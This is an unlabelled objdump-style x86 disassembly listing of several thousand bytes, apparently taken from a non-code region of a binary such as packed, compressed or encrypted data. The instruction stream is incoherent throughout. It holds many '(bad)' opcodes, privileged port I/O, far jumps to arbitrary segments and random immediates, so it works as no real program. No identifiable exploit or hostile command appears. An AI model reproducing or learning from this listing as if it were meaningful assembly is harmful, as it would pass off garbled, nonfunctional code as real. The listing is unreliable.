  425e4b:	dec    DWORD PTR [ecx-0x5a]
  425e4e:	sbb    bh,ah
  425e50:	jae    0x425de8
  425e52:	popa   
  425e53:	mov    al,ds:0x4374c430
  425e58:	shl    DWORD PTR [eax-0x6096089f],0x76
  425e5f:	shl    bl,cl
  425e61:	jo     0x425eb9
  425e63:	in     eax,0xf6
  425e65:	or     eax,0xe647469a
  425e6a:	cmc    
  425e6b:	aaa    
  425e6c:	ss mov edx,0x7ae42120
  425e72:	dec    ebp
  425e73:	out    0x38,eax
  425e75:	add    eax,DWORD PTR [ebx]
  425e77:	and    BYTE PTR [eax-0x27],bh
  425e7a:	jo     0x425e48
  425e7c:	out    0x54,al
  425e7e:	jl     0x425e1b
  425e80:	adc    al,0x2
  425e82:	sub    esp,DWORD PTR [esi+0x5cfffaa7]
  425e88:	fucomi st,st(1)
  425e8a:	addr16 imul esp,ebp,0x27ee986
  425e91:	xor    al,0xab
  425e93:	and    bl,bl
  425e95:	or     eax,DWORD PTR [esi+0x59404dc0]
  425e9b:	aam    0x54
  425e9d:	xor    cl,BYTE PTR [ebx-0x2cae0884]
  425ea3:	lods   eax,DWORD PTR ds:[esi]
  425ea4:	dec    ebp
  425ea5:	jae    0x425e4f
  425ea7:	les    edi,FWORD PTR [eax]
  425ea9:	fimul  WORD PTR [edx]
  425eab:	aad    0xb0
  425ead:	cmp    esi,ebx
  425eaf:	jl     0x425e77
  425eb1:	fst    st(6)
  425eb3:	sbb    al,BYTE PTR [edx+edi*4+0x7f]
  425eb7:	dec    edx
  425eb8:	xor    dl,BYTE PTR [ebp+0x6d68f0da]
  425ebe:	call   0xea4ea55c
  425ec3:	mov    dl,0xd2
  425ec5:	and    al,0x30
  425ec7:	gs mov cl,ah
  425eca:	push   esp
  425ecb:	(bad)  
  425ecd:	in     al,0xfe
  425ecf:	outs   dx,DWORD PTR ds:[esi]
  425ed0:	std    
  425ed1:	ficomp DWORD PTR [eax-0x3e9d0c3e]
  425ed7:	xlat   BYTE PTR ds:[ebx]
  425ed8:	sbb    BYTE PTR [eax+ecx*2+0x0],cl
  425edc:	jg     0x425f01
  425ede:	imul   ecx,edi,0xcf485e3c
  425ee4:	push   ecx
  425ee5:	ret    0xe2c8
  425ee8:	aas    
  425ee9:	xchg   ebp,eax
  425eea:	pop    edx
  425eeb:	cdq    
  425eec:	(bad)  
  425eed:	out    dx,eax
  425eee:	push   0xffffff8f
  425ef0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ef1:	push   0xb53669bf
  425ef6:	pusha  
  425ef7:	push   edi
  425ef8:	jg     0x425f23
  425efa:	mov    ?,WORD PTR [esi]
  425efc:	and    esp,DWORD PTR [esi]
  425efe:	clc    
  425eff:	fldcw  WORD PTR [eax-0x75100cb6]
  425f05:	test   BYTE PTR [eax],bl
  425f07:	sub    bh,BYTE PTR [edi-0x18]
  425f0a:	dec    esi
  425f0b:	push   ss
  425f0c:	pop    ds
  425f0d:	jb     0x425eca
  425f0f:	inc    edi
  425f10:	xchg   ecx,eax
  425f11:	inc    edx
  425f12:	mov    DWORD PTR [edx-0x52910ef],ecx
  425f18:	mov    esp,0xb03d069b
  425f1d:	je     0x425ebb
  425f1f:	retf   
  425f20:	pushf  
  425f21:	pop    ecx
  425f22:	add    al,0xc4
  425f25:	icebp  
  425f26:	std    
  425f27:	fistp  WORD PTR [esi+0x24422cc2]
  425f2d:	shl    BYTE PTR [ebp+0x0],cl
  425f33:	add    BYTE PTR [eax],al
  425f35:	add    BYTE PTR [eax],al
  425f37:	add    BYTE PTR [eax],al
  425f39:	add    BYTE PTR [edx],cl
  425f3b:	xchg   edx,eax
  425f3c:	jl     0x425f77
  425f3e:	cld    
  425f3f:	dec    DWORD PTR [edi-0x4d]
  425f42:	or     DWORD PTR [eax+eax*1],ebp
  425f45:	sub    ebx,DWORD PTR [edi-0x74]
  425f48:	mov    ds:0x1d68ad3,al
  425f4d:	add    ch,bh
  425f4f:	add    DWORD PTR [eax],eax
  425f51:	add    bl,bh
  425f53:	popaw  
  425f55:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f57:	fldenv [ecx]
  425f59:	add    esp,DWORD PTR [edi+0x770cb4a8]
  425f5f:	std    
  425f60:	xor    al,0x8b
  425f62:	jmp    0x38c32469
  425f67:	push   0x60
  425f69:	jbe    0x425fc2
  425f6b:	mov    bl,0x71
  425f6d:	es push 0x81a533cc
  425f73:	add    al,0xed
  425f75:	imul   edi,ebp,0xffffffd3
  425f78:	sbb    eax,0x931f3eba
  425f7d:	mov    edi,0xd24e603c
  425f82:	in     eax,dx
  425f83:	push   0xf
  425f85:	push   ss
  425f86:	scas   eax,DWORD PTR es:[edi]
  425f87:	cwde   
  425f88:	push   esp
  425f89:	add    al,0xbe
  425f8b:	popf   
  425f8c:	pop    ebx
  425f8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f8e:	div    BYTE PTR es:[ebx-0x11c0c20b]
  425f95:	dec    eax
  425f96:	cmp    al,0x9b
  425f98:	in     al,0x9a
  425f9a:	dec    ecx
  425f9b:	adc    ah,BYTE PTR [esi-0x25989771]
  425fa1:	xor    bh,BYTE PTR [ebp+0x13]
  425fa4:	dec    esi
  425fa5:	inc    edi
  425fa6:	inc    ecx
  425fa7:	ss dec edx
  425fa9:	push   ds
  425faa:	call   0xf99e3e12
  425faf:	jo     0x425f34
  425fb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fb2:	xor    BYTE PTR [esi-0x3ee91aab],dl
  425fb8:	push   edi
  425fb9:	push   esp
  425fba:	sbb    DWORD PTR [ebp-0x3dc5248],ebp
  425fc0:	mov    esi,0xa214ea9
  425fc5:	add    dh,BYTE PTR [ebp+0x36c1e33b]
  425fcb:	and    DWORD PTR [ebp-0x44df3c29],0x29387be8
  425fd5:	add    ah,BYTE PTR [edi]
  425fd7:	in     al,0x0
  425fd9:	sar    dh,1
  425fdb:	ins    BYTE PTR es:[edi],dx
  425fdc:	je     0x425fcd
  425fde:	gs mov bh,0xa1
  425fe1:	cli    
  425fe2:	iret   
  425fe3:	jne    0x425f80
  425fe5:	aas    
  425fe6:	arpl   bp,ax
  425fe8:	adc    BYTE PTR [ecx],0x60
  425feb:	es or  edx,esi
  425fee:	or     al,0x3b
  425ff0:	adc    BYTE PTR [esi],0xe7
  425ff3:	into   
  425ff4:	test   al,0xe3
  425ff6:	addr16 out 0xd0,eax
  425ff9:	inc    edx
  425ffa:	adc    al,0x27
  425ffc:	xchg   ebx,eax
  425ffd:	or     DWORD PTR ds:0x22a093c9,ebp
  426003:	pop    edx
  426004:	mov    es,WORD PTR [ebx]
  426006:	dec    edx
  426007:	dec    edx
  426008:	mov    ah,0x23
  42600a:	xor    dh,ah
  42600c:	inc    edx
  42600d:	ins    BYTE PTR es:[edi],dx
  42600e:	shr    ebx,0xce
  426011:	gs xchg esi,eax
  426013:	inc    esp
  426014:	jp     0x425faa
  426016:	retf   0x8573
  426019:	ins    BYTE PTR es:[edi],dx
  42601a:	aas    
  42601b:	ds inc ecx
  42601d:	add    al,0xb0
  42601f:	mov    dh,0x1b
  426021:	test   dl,bh
  426023:	cmp    BYTE PTR [esi+0x45a96536],bh
  426029:	ds mov ebx,0x7c390e0
  42602f:	push   eax
  426030:	pop    ecx
  426031:	cld    
  426032:	push   cs
  426033:	enter  0xd48e,0x74
  426037:	(bad)  
  426038:	data16 scas al,BYTE PTR es:[edi]
  42603a:	dec    ecx
  42603b:	fisttp QWORD PTR [edx-0x76]
  42603e:	call   0x8bfdf4d3
  426043:	cld    
  426044:	cmp    ah,0x86
  426047:	and    edx,DWORD PTR [ecx+edi*8]
  42604a:	fsub   st(1),st
  42604c:	(bad)  
  42604e:	mov    bh,0xde
  426050:	rcl    BYTE PTR [edx],1
  426052:	inc    eax
  426053:	pop    ss
  426054:	cwde   
  426055:	lods   eax,DWORD PTR ds:[esi]
  426056:	cs push 0x5b909f59
  42605c:	cwde   
  42605d:	scas   al,BYTE PTR es:[edi]
  42605e:	inc    eax
  42605f:	or     eax,DWORD PTR [eax]
  426061:	xchg   DWORD PTR [ebp+0x3785e5cc],esp
  426067:	mov    eax,0xd664885c
  42606c:	test   DWORD PTR [ebx],0x281af59f
  426072:	jns    0x426000
  426074:	adc    BYTE PTR [ecx+0x36],dh
  426077:	xor    eax,0xcfec5970
  42607c:	sti    
  42607d:	mov    bl,0x83
  42607f:	pushf  
  426080:	int3   
  426081:	shl    DWORD PTR [esp+ecx*2],0x5a
  426085:	jmp    0x4260be
  426087:	ss (bad) 
  426089:	jmp    0x426040
  42608b:	mov    ecx,0x6145e2cf
  426090:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  426092:	adc    bl,cl
  426094:	mov    dl,0x4f
  426097:	sbb    bl,BYTE PTR [esi-0xc]
  42609a:	cli    
  42609b:	push   esp
  42609c:	xchg   BYTE PTR [ecx+0x62],al
  42609f:	out    dx,eax
  4260a0:	lods   eax,DWORD PTR ds:[esi]
  4260a1:	sub    BYTE PTR ds:0xd011d2ea,bl
  4260a7:	and    DWORD PTR [edi],eax
  4260a9:	mov    eax,0x758c585f
  4260ae:	div    BYTE PTR [esi+0x6d]
  4260b1:	and    DWORD PTR [edi],0xffffff9a
  4260b4:	call   0xef93:0xc915ed0
  4260bb:	sti    
  4260bc:	mul    BYTE PTR [edx-0x75]
  4260bf:	jmp    0xeab2:0x295090f
  4260c6:	push   ds
  4260c7:	jmp    0xb9cf:0xfbffcd42
  4260ce:	rol    esp,0xdc
  4260d1:	cmp    DWORD PTR [ebx],ebp
  4260d3:	jo     0x4260a6
  4260d5:	loope  0x426123
  4260d7:	mov    esp,0x38793f76
  4260dc:	in     al,dx
  4260dd:	sbb    eax,0x82e1790
  4260e2:	adc    BYTE PTR [edi-0x2ea17773],0xe9
  4260e9:	push   edx
  4260ea:	and    ebp,DWORD PTR [edi-0x3a]
  4260ed:	stc    
  4260ee:	ret    0x8743
  4260f1:	repnz xchg ecx,eax
  4260f3:	cli    
  4260f4:	lods   eax,DWORD PTR ds:[esi]
  4260f5:	xchg   BYTE PTR [eax-0x518ef6f5],cl
  4260fb:	push   cs
  4260fc:	sub    BYTE PTR [eax-0x10],bh
  4260ff:	sbb    eax,0x86d0f33a
  426104:	fidivr DWORD PTR [eax]
  426106:	mov    edx,0xd7ce348f
  42610b:	aaa    
  42610c:	jb     0x426111
  42610e:	ds pop edi
  426110:	jecxz  0x42611f
  426112:	arpl   WORD PTR ds:0xde4a402f,dx
  426118:	mov    WORD PTR [esi-0x1fbbdeb5],ds
  42611e:	mov    al,ch
  426120:	lahf   
  426121:	fwait
  426122:	push   edx
  426123:	mov    ebx,0x99e8063f
  426128:	les    ebx,FWORD PTR [ecx+ecx*1+0x6c253f0c]
  42612f:	sub    ebx,edi
  426131:	adc    eax,0x5b91437d
  426136:	mov    ebx,DWORD PTR [edx-0x74]
  426139:	pop    ebp
  42613a:	cmp    bh,BYTE PTR [ebp+0xa3a7aaf]
  426140:	mov    dl,BYTE PTR [eax-0x50939ccb]
  426146:	je     0x426174
  426148:	or     ebx,edx
  42614a:	dec    esp
  42614b:	mov    BYTE PTR [ecx-0x2e],0xf0
	...
  426157:	add    BYTE PTR [eax],al
  426159:	add    bl,al
  42615b:	and    ecx,edx
  42615d:	dec    eax
  42615e:	repz clc 
  426160:	fld    TBYTE PTR [ebx-0x2cd29d30]
  426166:	fisttp DWORD PTR [ecx+0x25]
  426169:	fadd   DWORD PTR [edi-0x2fffe28]
  42616f:	add    DWORD PTR [eax],eax
  426171:	add    BYTE PTR [esi],cl
  426173:	mov    bh,0x46
  426175:	in     eax,dx
  426176:	and    eax,0xcb1473db
  42617b:	into   
  42617c:	adc    al,BYTE PTR [esi+0x69]
  42617f:	adc    eax,0x435ed80f
  426185:	inc    esi
  426186:	sub    BYTE PTR [eax-0x11df4345],ch
  42618c:	cmc    
  42618d:	fild   WORD PTR [esi+0x1c]
  426190:	fadd   DWORD PTR [edx+0x4df52c0c]
  426196:	mov    cs:0xeab1478,al
  42619c:	inc    edx
  42619d:	sub    al,0x5f
  42619f:	jmp    0xaed8:0xe9be5e16
  4261a6:	mov    edx,0xf042bbdd
  4261ab:	aaa    
  4261ac:	ins    DWORD PTR es:[edi],dx
  4261ad:	dec    ecx
  4261ae:	adc    eax,0xfa79b051
  4261b3:	fcmove st,st(2)
  4261b5:	mov    ds:0x508fe449,al
  4261ba:	clc    
  4261bb:	retf   0xd2bf
  4261be:	je     0x4261c5
  4261c0:	xor    al,0xeb
  4261c2:	fnstsw WORD PTR [esi+0x6512108a]
  4261c8:	imul   ebp,esi,0x63
  4261cb:	dec    ebp
  4261cc:	ficom  WORD PTR [edi+0x42]
  4261cf:	push   ecx
  4261d0:	cs cwde 
  4261d2:	xor    edx,DWORD PTR [ecx]
  4261d4:	shr    esp,1
  4261d6:	je     0x42616b
  4261d8:	and    bl,cl
  4261da:	les    edx,FWORD PTR [ebx]
  4261dc:	(bad)  
  4261dd:	cmp    eax,0x19289c0b
  4261e2:	inc    esp
  4261e3:	sahf   
  4261e4:	mov    dl,0x5
  4261e6:	sbb    DWORD PTR [ebp+0x4eeccec],0xac179598
  4261f0:	pop    ebx
  4261f1:	int    0x85
  4261f3:	mov    ds:0xee05510c,al
  4261f8:	outs   dx,BYTE PTR ds:[esi]
  4261f9:	mov    ?,WORD PTR [edx+esi*2-0x7a3590a3]
  426200:	call   0x9d59:0x7add2b27
  426207:	shr    bl,1
  426209:	in     al,dx
  42620a:	sub    bl,ch
  42620c:	mov    ebp,0xeea9f436
  426211:	push   DWORD PTR [ebx]
  426213:	retf   0x4f27
  426216:	and    dl,ah
  426218:	push   0xffffffa7
  42621a:	test   BYTE PTR [eax-0x6be50b97],ch
  426220:	in     al,dx
  426221:	out    dx,al
  426222:	pop    esi
  426223:	xor    BYTE PTR [eax],cl
  426225:	cmp    ecx,DWORD PTR ds:0xd8c5b967
  42622b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42622c:	jl     0x426267
  42622e:	mov    esi,0xd9bb8b18
  426233:	iret   
  426234:	das    
  426235:	sub    ah,BYTE PTR [ecx+0x2]
  426238:	add    eax,0x7bd13e59
  42623d:	or     ecx,esp
  42623f:	adc    eax,0xd2eb071
  426244:	and    DWORD PTR ds:[edx-0x6ebf2aab],ebx
  42624b:	ret    
  42624c:	ret    
  42624d:	jg     0x4261ee
  42624f:	or     dl,BYTE PTR [ebp-0x4e]
  426252:	arpl   WORD PTR [ecx+ebx*2-0x30],si
  426256:	aaa    
  426257:	cs int 0xa8
  42625a:	lahf   
  42625b:	adc    DWORD PTR [edi],esp
  42625d:	mov    ds:0x6782528a,al
  426262:	pushf  
  426263:	dec    ebp
  426264:	out    0xee,al
  426266:	aam    0xa6
  426268:	dec    edx
  426269:	jmp    0x73ece748
  42626e:	rcl    BYTE PTR [edx],cl
  426270:	fcom   DWORD PTR [esi+ebp*1+0x2b]
  426274:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426275:	pop    edi
  426276:	jb     0x426272
  426278:	aas    
  426279:	aaa    
  42627a:	aad    0xed
  42627c:	nop
  42627d:	inc    ebp
  42627e:	inc    eax
  42627f:	pop    ss
  426280:	shl    BYTE PTR [ecx+0x6c3abe7e],0x90
  426287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426288:	hlt    
  426289:	jno    0x42626d
  42628b:	aad    0xda
  42628d:	jg     0x4262e0
  42628f:	scas   al,BYTE PTR es:[edi]
  426290:	popf   
  426291:	in     al,dx
  426292:	or     eax,0x7ae86c59
  426297:	pop    edi
  426298:	iret   
  426299:	clc    
  42629a:	mov    ecx,0xb50e2f98
  42629f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262a0:	adc    al,0xe7
  4262a2:	(bad)  
  4262a4:	cs pop edx
  4262a6:	or     eax,0xc7abcda0
  4262ab:	in     eax,dx
  4262ac:	fmul   DWORD PTR [ebp+0x3aa5ccf2]
  4262b2:	in     eax,dx
  4262b3:	and    al,0x73
  4262b5:	push   cs
  4262b6:	sahf   
  4262b7:	cmc    
  4262b8:	call   0xb3ef0caf
  4262bd:	mov    edx,0x9c8557d9
  4262c2:	xor    edi,DWORD PTR [eax+0x59f259eb]
  4262c8:	(bad)  
  4262c9:	enter  0x6c13,0x14
  4262cd:	inc    ebx
  4262ce:	sbb    DWORD PTR [esi],0x44
  4262d1:	int3   
  4262d2:	test   BYTE PTR es:[ebx-0x3d0e54d3],al
  4262d9:	mov    ecx,DWORD PTR [edi]
  4262db:	xchg   ebx,eax
  4262dc:	in     eax,dx
  4262dd:	out    dx,al
  4262de:	or     al,0x23
  4262e0:	sbb    ebx,0x13347b4b
  4262e6:	xchg   ebp,eax
  4262e7:	jbe    0x42631d
  4262e9:	pop    es
  4262ea:	pop    esp
  4262eb:	jbe    0x426351
  4262ed:	std    
  4262ee:	ds dec eax
  4262f0:	repnz lods al,BYTE PTR ds:[esi]
  4262f2:	adc    bh,dl
  4262f4:	push   ecx
  4262f5:	out    0xf1,al
  4262f7:	lahf   
  4262f8:	mov    ebp,0x9e0283db
  4262fd:	mov    eax,ds:0x11a1f7ca
  426302:	and    ebp,DWORD PTR [edi-0x70]
  426305:	in     eax,0x38
  426307:	es jno 0x4262ba
  42630a:	scas   eax,DWORD PTR es:[edi]
  42630b:	stos   BYTE PTR es:[edi],al
  42630c:	add    ch,BYTE PTR [eax+0x39cdf66d]
  426312:	adc    ebp,ebx
  426314:	adc    DWORD PTR [esi],eax
  426316:	mov    al,0xd2
  426318:	popf   
  426319:	call   0x68b9:0x9faf3064
  426320:	mov    ebx,0xd04210eb
  426325:	jle    0x4263a0
  426327:	jp     0x42634b
  426329:	out    0xae,eax
  42632b:	push   esi
  42632c:	push   ebx
  42632d:	dec    edi
  42632e:	push   esp
  42632f:	xor    ebx,DWORD PTR [ebx-0x48d48e1c]
  426335:	cmp    DWORD PTR [edi-0x28],edi
  426338:	add    edx,DWORD PTR [ecx+ebx*1-0x30]
  42633c:	ret    0x534b
  42633f:	dec    ecx
  426340:	sbb    al,0x4c
  426342:	mov    edx,0x562eb7dc
  426347:	and    esi,DWORD PTR [ecx]
  426349:	fstp   TBYTE PTR [edx+0x29b2ee07]
  42634f:	std    
  426350:	push   0xffffffcf
  426352:	pop    ebp
  426353:	xor    eax,0xdfab2049
  426358:	mov    ah,0xdb
  42635a:	iret   
  42635b:	xor    DWORD PTR [eax-0x24],ecx
  42635e:	dec    ebp
  42635f:	inc    edx
  426360:	mov    ecx,DWORD PTR [esi-0x69d7ac47]
  426366:	cmc    
  426367:	mov    DWORD PTR [edi+0xe375ef7],esp
  42636d:	sbb    al,0xa
	...
  426377:	add    BYTE PTR [eax],al
  426379:	add    BYTE PTR [edx-0x101610a7],bl
  42637f:	call   FWORD PTR [esi-0x71a9f385]
  426385:	rcr    esi,cl
  426387:	push   esp
  426388:	int3   
  426389:	add    BYTE PTR [edx+ebx*8+0x1fd0001],0x0
  426391:	add    BYTE PTR [ebp-0x2a],bh
  426394:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426395:	cmp    BYTE PTR [edi],0x12
  426398:	pop    edi
  426399:	mov    eax,0x4f6e0865
  42639e:	rcr    ch,1
  4263a0:	jecxz  0x4263c2
  4263a2:	sub    eax,0xf5dcdc9
  4263a7:	es dec edx
  4263a9:	and    eax,0xacc8972c
  4263ae:	cs gs jecxz 0x426385
  4263b2:	mov    ecx,0xd1831ac3
  4263b7:	sbb    BYTE PTR [ecx+0x8],cl
  4263ba:	aad    0xe4
  4263bc:	test   al,0x5a
  4263be:	jne    0x426422
  4263c0:	call   0x80bb4aa8
  4263c5:	cs jmp 0x20d6:0x3c5a7fdd
  4263cd:	cmp    eax,0x69496273
  4263d2:	js     0x426399
  4263d4:	mov    esi,DWORD PTR [esi+0x2d21a33c]
  4263da:	xchg   esp,eax
  4263db:	xchg   ebx,eax
  4263dc:	pushf  
  4263dd:	push   0xffffff93
  4263df:	xchg   edx,eax
  4263e0:	push   0x7614f6e
  4263e5:	cmp    eax,0x86f685aa
  4263ea:	cmp    ch,BYTE PTR [edi]
  4263ec:	and    ebx,DWORD PTR [ebx]
  4263ee:	(bad)  
  4263ef:	outs   dx,BYTE PTR ds:[esi]
  4263f0:	xor    dl,ch
  4263f2:	dec    eax
  4263f3:	arpl   bp,si
  4263f5:	mov    dl,BYTE PTR [edx+0x3bd44e97]
  4263fb:	or     bh,BYTE PTR [ebx]
  4263fd:	cmp    BYTE PTR [ebx],al
  4263ff:	aas    
  426400:	sahf   
  426401:	adc    ch,bl
  426403:	iret   
  426404:	and    al,0xe
  426406:	cli    
  426407:	mov    ds:0x771ff453,eax
  42640c:	dec    ecx
  42640d:	imul   BYTE PTR [ebp-0x6919849e]
  426413:	pop    ss
  426414:	fsubrp st(2),st
  426416:	jge    0x426433
  426418:	mov    ecx,0x2c39522
  42641d:	out    dx,eax
  42641e:	mov    dl,0x4b
  426420:	inc    edi
  426421:	lock inc ebp
  426423:	or     eax,0x26d504fb
  426428:	aas    
  426429:	pop    ecx
  42642a:	std    
  42642b:	repnz or ecx,edx
  42642e:	mov    ds:0xfe0d29fc,eax
  426433:	push   es
  426434:	push   0xffffffdc
  426436:	mov    ds,WORD PTR [esi+0x3e]
  426439:	dec    edx
  42643a:	fwait
  42643b:	enter  0xaee7,0xd6
  42643f:	pop    ebx
  426440:	jb     0x426467
  426442:	jmp    0xd800:0x601f705d
  426449:	aam    0x2a
  42644b:	and    eax,0x4f21206e
  426450:	clc    
  426451:	push   ebp
  426452:	mov    ah,0x57
  426454:	and    edx,ebx
  426456:	adc    al,0x2b
  426458:	fs (bad) 
  42645a:	jno    0x42649e
  42645c:	inc    esp
  42645d:	pushf  
  42645e:	imul   ebp,DWORD PTR [esi+0x40],0xc4fe8927
  426465:	repz jmp FWORD PTR [edi-0x32f367fd]
  42646c:	test   al,0x74
  42646e:	hlt    
  42646f:	and    ah,BYTE PTR [ecx-0x9]
  426472:	loope  0x4264ea
  426474:	and    al,0xae
  426476:	xor    eax,0x49284807
  42647b:	cmp    bh,dl
  42647d:	ins    DWORD PTR es:[edi],dx
  42647e:	mov    esp,DWORD PTR [edx+0x39]
  426481:	out    0x2e,al
  426483:	sti    
  426484:	jb     0x4264d7
  426486:	sbb    ebx,DWORD PTR [eax]
  426488:	pop    esi
  426489:	adc    BYTE PTR [esp+ebp*4+0x4a32e15c],bl
  426490:	cmp    BYTE PTR [ebx+0x5cdb835c],ah
  426496:	dec    esi
  426497:	inc    ecx
  426498:	sub    BYTE PTR [eax+0x4d826c5],ah
  42649e:	in     al,dx
  42649f:	cmp    ebp,DWORD PTR ds:0xf5948169
  4264a5:	ret    0x7e89
  4264a8:	xor    BYTE PTR [edx+ecx*4-0x89efac1],dh
  4264af:	retf   0xb9a5
  4264b2:	stos   DWORD PTR es:[edi],eax
  4264b3:	xor    BYTE PTR [ecx+0x13],al
  4264b6:	xor    DWORD PTR [edi],edx
  4264b8:	lods   al,BYTE PTR ds:[esi]
  4264b9:	jmp    0xd65e:0xbd3e4175
  4264c0:	add    dh,ah
  4264c2:	jno    0x42648b
  4264c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4264c5:	je     0x426494
  4264c7:	xor    ebx,DWORD PTR [ebp-0x4b]
  4264ca:	dec    ebx
  4264cb:	or     DWORD PTR [eax+0x14957a4a],ecx
  4264d1:	in     eax,dx
  4264d2:	inc    esp
  4264d3:	jb     0x426479
  4264d5:	(bad)  
  4264d6:	out    0xbf,al
  4264d8:	in     eax,dx
  4264d9:	jmp    0xe878d3b0
  4264de:	xor    al,0x59
  4264e0:	imul   edi,DWORD PTR ds:0xde43d269,0xffffff92
  4264e7:	mov    edi,0x2eaf536c
  4264ec:	push   eax
  4264ed:	cmc    
  4264ee:	mov    dh,0xa9
  4264f0:	mov    DWORD PTR [ecx+0x1c],esp
  4264f3:	sub    bl,dl
  4264f5:	dec    ebp
  4264f6:	ja     0x426498
  4264f8:	adc    eax,0xe288c2bb
  4264fd:	jmp    FWORD PTR [ebx-0x43c2816]
  426503:	aas    
  426504:	fistp  QWORD PTR [ecx-0x23]
  426507:	test   eax,0xe66fa7ce
  42650c:	retf   
  42650d:	inc    ebp
  42650e:	dec    edx
  42650f:	mov    al,0x2b
  426511:	xchg   ecx,eax
  426512:	call   0x2c51:0x7d5aa68c
  426519:	add    bh,bl
  42651b:	push   cs
  42651c:	js     0x42651a
  42651e:	mov    ah,0xe3
  426520:	jne    0x4264fe
  426522:	inc    edi
  426523:	fsub   QWORD PTR [ebx+eax*8]
  426526:	mov    ah,0x22
  426528:	out    0x4c,eax
  42652a:	or     DWORD PTR [edx+0x7c],0x4ccf2904
  426531:	jp     0x42655a
  426533:	sbb    eax,0x3d07c2ef
  426538:	or     DWORD PTR [ebx-0x55fb67b],0x6c207c28
  426542:	dec    esp
  426543:	pop    eax
  426544:	int3   
  426545:	ja     0x426566
  426547:	(bad)  
  426548:	and    eax,DWORD PTR [edx+0x7b]
  42654b:	push   edi
  42654c:	mov    ecx,DWORD PTR [eax]
  42654e:	not    ch
  426550:	rcr    esp,0x86
  426553:	rcr    DWORD PTR ss:[esi-0x35],1
  426557:	adc    BYTE PTR [ecx-0x19],al
  42655a:	in     al,dx
  42655b:	pop    ebx
  42655c:	ss dec edi
  42655e:	pop    esp
  42655f:	stos   DWORD PTR es:[edi],eax
  426560:	sti    
  426561:	ds retf 0x8da4
  426565:	(bad)
  426569:	fadd   st(1),st
  42656b:	test   DWORD PTR [ecx],esp
  42656d:	mov    dl,0xfc
  42656f:	add    al,0x83
  426571:	sar    BYTE PTR [esi],cl
  426573:	add    ecx,DWORD PTR [ecx]
  426575:	imul   ecx,DWORD PTR [eax+eax*8-0x6ccb50aa],0xffffff97
  42657d:	sbb    DWORD PTR [edx-0x54a07039],edi
  426583:	neg    ebx
  426585:	inc    edi
  426586:	adc    al,0xda
  426588:	fcomp  st(3)
  42658a:	cmp    edi,esi
  42658c:	sbb    DWORD PTR [eax+esi*8+0x0],ebx
	...
  426598:	add    BYTE PTR [eax],al
  42659a:	(bad)  
  42659b:	rol    BYTE PTR [edi],0x37
  42659e:	dec    edi
  42659f:	idiv   DWORD PTR [ebp-0x7c857b06]
  4265a5:	jg     0x4265f8
  4265a7:	mov    BYTE PTR [ecx+0x1dc81a2],0x0
  4265ae:	std    
  4265af:	add    DWORD PTR [eax],eax
  4265b1:	add    BYTE PTR [edi-0x25],bl
  4265b4:	jo     0x426550
  4265b6:	inc    esp
  4265b7:	dec    cl
  4265b9:	inc    ebx
  4265ba:	enter  0x6720,0x12
  4265be:	cdq    
  4265bf:	xor    DWORD PTR [esi+0x11d99c8],edi
  4265c5:	mov    eax,ds:0x2653224
  4265ca:	popa   
  4265cb:	cmp    BYTE PTR [edx],ah
  4265cd:	pop    esp
  4265ce:	div    DWORD PTR [ebx-0x74a2648a]
  4265d4:	xchg   ebp,eax
  4265d5:	xchg   ebp,eax
  4265d6:	adc    esi,DWORD PTR [eax+ecx*1-0x46e571ba]
  4265dd:	cld    
  4265de:	mov    al,ds:0xe12baab2
  4265e3:	adc    bh,BYTE PTR [esi-0xb]
  4265e6:	stc    
  4265e7:	aad    0xb1
  4265e9:	push   0x4062539b
  4265ee:	push   ebp
  4265ef:	sub    DWORD PTR [esi-0x4abe0a3d],ecx
  4265f5:	add    al,0xba
  4265f7:	(bad)  
  4265f8:	idiv   DWORD PTR [eax]
  4265fa:	stos   BYTE PTR es:[edi],al
  4265fb:	mov    edi,0xecec951a
  426600:	dec    esp
  426601:	sub    DWORD PTR [ebx+esi*2],edx
  426604:	push   ss
  426605:	dec    edx
  426606:	lds    esp,FWORD PTR [edx]
  426608:	pop    esp
  426609:	cdq    
  42660a:	mov    bl,0x31
  42660c:	inc    edi
  42660d:	imul   ecx,DWORD PTR [eax+ebp*2],0xffffffc9
  426611:	dec    esp
  426612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426613:	stos   DWORD PTR es:[edi],eax
  426614:	mov    bh,0x48
  426616:	cmp    ah,BYTE PTR ds:0x9c0b34bf
  42661c:	lds    esi,FWORD PTR [edx+0x1c714167]
  426622:	fcomip st,st(2)
  426624:	dec    edi
  426625:	clc    
  426626:	out    dx,al
  426627:	test   ebp,0x69830c24
  42662d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42662e:	repnz in eax,0xd2
  426631:	jecxz  0x4265f4
  426633:	rol    esp,0x24
  426636:	fs sbb al,0x6b
  426639:	call   0x3ae4bc0b
  42663e:	mov    BYTE PTR ds:0xb3da0a97,bh
  426644:	add    eax,ecx
  426646:	loope  0x4265e9
  426648:	xlat   BYTE PTR ds:[ebx]
  426649:	(bad)  [ebp+0x2f789fc0]
  42664f:	pop    ss
  426650:	inc    ebx
  426651:	ret    0xf9b1
  426654:	add    eax,0xcf0fed0
  426659:	mov    esp,eax
  42665b:	push   ds
  42665c:	mov    edx,0xd281c3a7
  426661:	test   BYTE PTR [eax],ah
  426663:	cmp    BYTE PTR [edi],al
  426665:	and    BYTE PTR [ebx],dl
  426667:	xchg   ebp,eax
  426668:	test   DWORD PTR [ecx+0x6d],eax
  42666b:	mov    ebx,0x5fd355cd
  426670:	idiv   DWORD PTR [edx+0x24899f9c]
  426676:	ret    
  426677:	add    ebp,DWORD PTR [esi-0x13]
  42667a:	sbb    cl,BYTE PTR [edi+edx*8-0x3ba2d183]
  426681:	dec    esi
  426682:	mov    ah,0x4c
  426684:	(bad)  
  426685:	out    dx,eax
  426686:	pop    esi
  426687:	(bad)  
  426688:	not    BYTE PTR [ecx+ebp*4]
